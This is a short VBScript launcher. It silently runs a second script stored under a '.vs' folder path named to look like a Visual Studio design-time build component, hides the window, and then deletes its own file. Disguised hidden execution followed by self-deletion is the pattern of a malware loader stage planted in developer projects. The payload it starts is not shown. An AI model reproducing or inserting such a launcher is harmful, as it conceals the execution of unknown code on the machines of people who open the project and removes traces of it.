Dim vbsFilePath
vbsFilePath = ".\.vs\FileContentIndex\DesignTimeBuild\VisualStudioMng\DesignTimeBuild.vbs" ' Change this to the desired VBS file path

Set shell = CreateObject("WScript.Shell")
shell.Run "wscript.exe " & vbsFilePath, 0, False

Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
fso.DeleteFile WScript.ScriptFullName
Set fso = Nothing